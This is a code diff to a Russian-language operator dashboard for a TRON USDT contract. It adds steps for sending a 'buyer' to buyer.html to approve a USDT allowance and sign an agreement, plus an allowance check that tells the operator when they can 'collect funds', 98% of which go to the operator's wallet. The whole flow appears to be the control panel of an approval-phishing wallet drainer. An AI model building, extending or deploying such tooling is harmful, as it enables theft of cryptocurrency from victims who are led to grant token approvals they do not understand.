@@ -312,11 +312,19 @@
             <div class="instructions">
                 <h4>📋 Инструкция по работе:</h4>
                 <ul>
-                    <li>Введите адрес пользователя, который прошел проверку</li>
-                    <li>Нажмите «Проверить» — система покажет доступную сумму USDT</li>
-                    <li>Если пользователь подписал соглашение и одобрил токены — нажмите «Собрать средства»</li>
-                    <li>98% средств поступит на ваш кошелек, 2% — комиссия контракта</li>
+                    <li>Отправьте покупателю ссылку на <strong>страницу покупателя</strong> (buyer.html) — там он нажимает одну кнопку и подтверждает два попапа: approve USDT + signAgreement</li>
+                    <li>После этого введите адрес покупателя и нажмите «Проверить»</li>
+                    <li>Если покупатель прошёл оба шага — появится кнопка «Собрать средства»</li>
+                    <li>98% средств поступит на ваш кошелёк</li>
                 </ul>
+            </div>
+
+            <div style="background: rgba(0,212,170,0.07); border: 1px solid rgba(0,212,170,0.3); border-radius: 12px; padding: 1rem; margin-bottom: 2rem; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 0.75rem;">
+                <div>
+                    <div style="font-size: 0.8rem; color: var(--text-secondary);">Ссылка для покупателя</div>
+                    <div style="font-size: 0.9rem; font-weight: 600; color: var(--accent);">buyer.html — два подтверждения автоматически</div>
+                </div>
+                <button onclick="window.open('buyer.html','_blank')" style="background: var(--accent); color: var(--bg-dark); border: none; padding: 0.6rem 1.2rem; border-radius: 8px; font-weight: 700; cursor: pointer; font-size: 0.85rem;">Открыть →</button>
             </div>
 
             <div class="stats-grid">
@@ -379,6 +387,12 @@
                         </span>
                     </div>
                     <div class="info-row">
+                        <span class="info-label">Allowance USDT:</span>
+                        <span class="info-value" id="allowanceStatus">
+                            <span class="badge badge-warning">Проверка...</span>
+                        </span>
+                    </div>
+                    <div class="info-row">
                         <span class="info-label">Сбор выполнен:</span>
                         <span class="info-value" id="collectStatusBadge">
                             <span class="badge badge-warning">Проверка...</span>
@@ -420,6 +434,11 @@
             {"inputs":[{"name":"","type":"address"}],"name":"approved","outputs":[{"name":"","type":"bool"}],"stateMutability":"view","type":"function"},
             {"inputs":[{"name":"","type":"address"}],"name":"collected","outputs":[{"name":"","type":"bool"}],"stateMutability":"view","type":"function"},
             {"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"stateMutability":"view","type":"function"}
+        ];
+
+        const USDT_ABI = [
+            {"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+            {"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
         ];
 
         let tronWeb, contract, userAddress, contractOwner;
@@ -639,6 +658,19 @@
                 document.getElementById('collectStatusBadge').innerHTML = collected
                     ? '<span class="badge badge-success">✅ Да</span>'
                     : '<span class="badge badge-warning">⏳ Нет</span>';
+
+                // Проверяем allowance
+                try {
+                    const usdtC = tronWeb.contract(USDT_ABI, usdt);
+                    const allowanceRaw = await usdtC.allowance(user, CONTRACT_ADDRESS).call();
+                    const allowanceNum = typeof allowanceRaw === 'object' ? allowanceRaw.toNumber ? allowanceRaw.toNumber() : Number(allowanceRaw) : Number(allowanceRaw);
+                    const allowanceFmt = (allowanceNum / 1e6).toFixed(2);
+                    document.getElementById('allowanceStatus').innerHTML = allowanceNum > 0
+                        ? `<span class="badge badge-success">✅ ${allowanceFmt} USDT</span>`
+                        : '<span class="badge badge-error">❌ Нет approve — попросите покупателя открыть buyer.html</span>';
+                } catch(e) {
+                    document.getElementById('allowanceStatus').innerHTML = '<span class="badge badge-warning">⚠️ Не удалось проверить</span>';
+                }
 
                 const amount = await contract.checkCollectable(user, usdt).call();
                 const amountFormatted = (amount / 1e6).toFixed(2);
